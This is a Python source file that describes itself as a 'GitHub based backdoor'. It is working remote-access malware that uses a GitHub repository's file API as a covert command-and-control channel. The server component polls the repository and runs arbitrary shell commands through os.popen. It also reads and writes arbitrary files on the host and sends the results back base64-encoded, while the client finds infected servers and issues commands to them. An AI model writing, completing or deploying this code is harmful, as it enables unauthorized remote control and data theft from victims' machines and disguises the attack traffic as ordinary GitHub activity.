import requests
import base64
import json
import time
import os
from datetime import datetime
import uuid


class GitHubChannel:
    def __init__(self, token, repo_owner, repo_name):
        self.repo = f"{repo_owner}/{repo_name}"
        self.channel_id = str(uuid.uuid4())
        self.headers = {
            "Accept": "application/vnd.github.v3+json",
            "Content-Type": "application/json",
            "Authorization": f"Bearer {token}",
        }
        self.api_base = f"https://api.github.com/repos/{repo_owner}/{repo_name}"

    def create_file(self, path, content, message="Update"):
        url = f"{self.api_base}/contents/{path}"

        # Convert content to base64 if needed
        if isinstance(content, str):
            content = base64.b64encode(content.encode()).decode()
        else:
            content = base64.b64encode(content).decode()

        # Check if file exists
        r = requests.get(url, headers=self.headers)
        data = {
            "message": message,
            "content": content,
        }

        if r.status_code == 200:
            data["sha"] = r.json()["sha"]

        try:
            r = requests.put(url, headers=self.headers, json=data)
            return r.status_code in [200, 201]
        except Exception as e:
            print(f"Error creating/updating file: {e}")
            return False

    def read_file(self, path):
        url = f"{self.api_base}/contents/{path}"
        try:
            r = requests.get(url, headers=self.headers)
            if r.status_code == 200:
                content = base64.b64decode(r.json()["content"]).decode()
                return content
            return None
        except Exception as e:
            print(f"Error reading file: {e}")
            return None

    def delete_file(self, path):
        url = f"{self.api_base}/contents/{path}"
        try:
            r = requests.get(url, headers=self.headers)
            if r.status_code == 200:
                sha = r.json()["sha"]
                data = {"message": "Delete file", "sha": sha}
                r = requests.delete(url, headers=self.headers, json=data)
                return r.status_code == 200
            return False
        except Exception as e:
            print(f"Error deleting file: {e}")
            return False


class Server:
    def __init__(self, token, repo_owner, repo_name):
        self.channel = GitHubChannel(token, repo_owner, repo_name)
        self.last_handled_time = (
            {}
        )  # Store last handled timestamp for each command type

    def start(self):
        print(f"[*] Server started with channel ID: {self.channel.channel_id}")
        start_time = datetime.now().isoformat()
        self.channel.create_file(
            f"{self.channel.channel_id}.server", f"SERVER|{start_time}|READY"
        )

        try:
            while True:
                # Handle commands
                content = self.channel.read_file(f"{self.channel.channel_id}.in")
                if content:
                    try:
                        parts = content.split("|", 2)
                        if len(parts) == 3:
                            command_src = parts[0]
                            command_time = datetime.fromisoformat(parts[1])
                            command = parts[2]

                            # Check if this is a new command
                            command_type = command.split(" ")[0]
                            last_time = self.last_handled_time.get(command_type)

                            if last_time and command_time <= datetime.fromisoformat(
                                last_time
                            ):
                                print(
                                    f"[-] Ignoring stale command from {command_time} (last handled: {last_time})"
                                )
                                self.channel.delete_file(
                                    f"{self.channel.channel_id}.in"
                                )
                                continue

                            print(
                                f"[+] Processing {command_type} command from {command_time}"
                            )

                            # Execute command
                            response = self.handle_command(command)

                            # Update last handled time
                            self.last_handled_time[command_type] = (
                                datetime.now().isoformat()
                            )

                            # Send response
                            resp_time = datetime.now().isoformat()
                            resp_content = f"SERVER|{resp_time}|{base64.b64encode(response.encode()).decode()}"

                            if self.channel.create_file(
                                f"{self.channel.channel_id}.out", resp_content
                            ):
                                print(
                                    f"[+] Response sent at {resp_time} for command from {command_time}"
                                )
                                self.channel.delete_file(
                                    f"{self.channel.channel_id}.in"
                                )

                    except Exception as e:
                        print(f"[-] Error processing command: {e}")
                        self.channel.delete_file(f"{self.channel.channel_id}.in")

                # Handle write requests
                write_content = self.channel.read_file(
                    f"{self.channel.channel_id}.write"
                )
                if write_content:
                    try:
                        parts = write_content.split("|", 3)
                        if len(parts) == 4:
                            write_src = parts[0]
                            write_time = datetime.fromisoformat(parts[1])

                            # Check if this is a new write request
                            last_write = self.last_handled_time.get("write")
                            if last_write and write_time <= datetime.fromisoformat(
                                last_write
                            ):
                                print(
                                    f"[-] Ignoring stale write request from {write_time} (last handled: {last_write})"
                                )
                                self.channel.delete_file(
                                    f"{self.channel.channel_id}.write"
                                )
                                continue

                            filepath = parts[2]
                            file_content = base64.b64decode(parts[3])

                            print(
                                f"[+] Processing write request from {write_time} for {filepath}"
                            )

                            # Perform write operation
                            with open(filepath, "wb") as f:
                                f.write(file_content)

                            # Update last handled time
                            self.last_handled_time["write"] = datetime.now().isoformat()

                            # Send status
                            resp_time = datetime.now().isoformat()
                            resp = f"SERVER|{resp_time}|Write successful: {filepath}"
                            self.channel.create_file(
                                f"{self.channel.channel_id}.write_status", resp
                            )
                            print(
                                f"[+] Write completed at {resp_time} for request from {write_time}"
                            )

                    except Exception as e:
                        resp_time = datetime.now().isoformat()
                        resp = f"SERVER|{resp_time}|Write failed: {str(e)}"
                        self.channel.create_file(
                            f"{self.channel.channel_id}.write_status", resp
                        )
                        print(f"[-] Write failed: {e}")
                    finally:
                        self.channel.delete_file(f"{self.channel.channel_id}.write")

                time.sleep(2)

        except KeyboardInterrupt:
            print("\n[*] Server shutting down...")
            self.cleanup()
        except Exception as e:
            print(f"Error in server loop: {e}")
            self.cleanup()

    def handle_command(self, cmd):
        """Handle client commands"""
        parts = cmd.split(" ", 1)
        cmd_type = parts[0]

        if cmd_type == "run" and len(parts) > 1:
            try:
                return os.popen(parts[1]).read()
            except Exception as e:
                return f"Error executing command: {str(e)}"

        elif cmd_type == "read" and len(parts) > 1:
            try:
                with open(parts[1], "rb") as f:
                    return base64.b64encode(f.read()).decode()
            except Exception as e:
                return f"Error reading file: {str(e)}"

        return f"Unknown or invalid command: {cmd_type}"

    def cleanup(self):
        """Clean up channel files"""
        try:
            self.channel.delete_file(f"{self.channel.channel_id}.server")
            self.channel.delete_file(f"{self.channel.channel_id}.in")
            self.channel.delete_file(f"{self.channel.channel_id}.out")
            self.channel.delete_file(f"{self.channel.channel_id}.write")
            self.channel.delete_file(f"{self.channel.channel_id}.write_status")
            print("[+] Cleanup completed")
        except Exception as e:
            print(f"[-] Error during cleanup: {e}")


class Client:
    def __init__(self, token, repo_owner, repo_name):
        self.channel = GitHubChannel(token, repo_owner, repo_name)

    def find_server(self, id=None):
        print("[*] Looking for active server...")
        while True:
            try:
                r = requests.get(
                    f"{self.channel.api_base}/contents", headers=self.channel.headers
                )

                if r.status_code == 200:
                    for item in r.json():
                        if (id and item["name"] == f"{id}.server") or (
                            not id and item["name"].endswith(".server")
                        ):
                            content = self.channel.read_file(item["name"])
                            if content and content.startswith("SERVER"):
                                self.channel.channel_id = item["name"].replace(
                                    ".server", ""
                                )
                                print(
                                    f"[+] Found server channel: {self.channel.channel_id}"
                                )
                                return True

            except Exception as e:
                print(f"[-] Error finding server: {str(e)}")

            time.sleep(2)

    def send_command(self, command):
        """Send command and verify response timestamp"""
        # Generate current timestamp
        timestamp = datetime.now().isoformat()
        content = f"CLIENT|{timestamp}|{command}"

        if self.channel.create_file(f"{self.channel.channel_id}.in", content):
            print(f"[+] Command sent at {timestamp}, waiting for response...")

            start_time = time.time()
            while time.time() - start_time < 30:  # 30 second timeout
                response = self.channel.read_file(f"{self.channel.channel_id}.out")
                if response:
                    parts = response.split("|", 2)
                    if len(parts) == 3:
                        try:
                            # Parse timestamps
                            response_time = datetime.fromisoformat(parts[1])
                            command_time = datetime.fromisoformat(timestamp)

                            # Verify response is newer than command
                            if response_time <= command_time:
                                print(
                                    f"[-] Ignoring stale response from {response_time}"
                                )
                                time.sleep(1)
                                continue

                            decoded = base64.b64decode(parts[2]).decode()
                            print(f"[+] Server response (at {response_time}):")

                            # Handle file read responses
                            if command.startswith("read "):
                                try:
                                    # Decode the base64 file content
                                    file_content = base64.b64decode(decoded)
                                    # Get the filename from the command
                                    filename = command.split(" ", 1)[1]
                                    # Save to local file with same name
                                    local_filename = os.path.basename(filename)
                                    with open(local_filename, "wb") as f:
                                        f.write(file_content)
                                    print(
                                        f"[+] File saved locally as: {local_filename}"
                                    )
                                except Exception as e:
                                    print(f"[-] Error saving file: {e}")
                                    print("Raw response:")
                                    print(decoded)
                            else:
                                print(decoded)

                            self.channel.delete_file(f"{self.channel.channel_id}.out")
                            return decoded

                        except Exception as e:
                            print(f"[-] Error processing response: {e}")
                            return None

                time.sleep(1)

            print("[-] Response timeout")
            return None
        else:
            print("[-] Failed to send command")
            return None

    def write_file(self, local_path, remote_path):
        """Write a local file to the remote server"""
        try:
            # Read local file
            with open(local_path, "rb") as f:
                file_content = f.read()

            # Generate current timestamp
            timestamp = datetime.now().isoformat()

            # Format write request
            content = f"CLIENT|{timestamp}|{remote_path}|{base64.b64encode(file_content).decode()}"

            if self.channel.create_file(f"{self.channel.channel_id}.write", content):
                print(f"[+] Write request sent at {timestamp}, waiting for status...")

                # Wait for write status
                start_time = time.time()
                while time.time() - start_time < 30:  # 30 second timeout
                    status = self.channel.read_file(
                        f"{self.channel.channel_id}.write_status"
                    )
                    if status:
                        parts = status.split("|", 2)
                        if len(parts) == 3:
                            status_time = datetime.fromisoformat(parts[1])
                            if status_time > datetime.fromisoformat(timestamp):
                                print(f"[+] Server status: {parts[2]}")
                                self.channel.delete_file(
                                    f"{self.channel.channel_id}.write_status"
                                )
                                return True
                    time.sleep(1)

                print("[-] Write status timeout")
                return False

            print("[-] Failed to send write request")
            return False

        except Exception as e:
            print(f"[-] Error writing file: {e}")
            return False


def main():
    import argparse

    parser = argparse.ArgumentParser(description="GitHub based backdoor")
    parser.add_argument("mode", choices=["server", "client"], help="Run mode")
    parser.add_argument("--id", required=False, help="GitHub file id")
    # parser.add_argument("--token", required=True, help="GitHub fine-grained token")
    # parser.add_argument("--owner", required=True, help="Repository owner")
    # parser.add_argument("--repo", required=True, help="Repository name")

    args = parser.parse_args()

    args.token = os.environ.get("GITHUB_TOKEN")
    args.owner = os.environ.get("GITHUB_OWNER")
    args.repo = os.environ.get("GITHUB_REPO")

    if args.mode == "server":
        server = Server(args.token, args.owner, args.repo)
        server.start()
    else:
        client = Client(args.token, args.owner, args.repo)
        if client.find_server(id=args.id):
            while True:
                try:
                    cmd = input("Command> ")
                    if cmd.lower() in ["exit", "quit"]:
                        break

                    # Handle write command
                    if cmd.startswith("write "):
                        parts = cmd.split(" ", 2)
                        if len(parts) == 3:
                            local_path, remote_path = parts[1], parts[2]
                            client.write_file(local_path, remote_path)
                        else:
                            print("Usage: write <local_path> <remote_path>")
                    else:
                        client.send_command(cmd)

                except KeyboardInterrupt:
                    break
                except Exception as e:
                    print(f"Error: {e}")


if __name__ == "__main__":
    main()
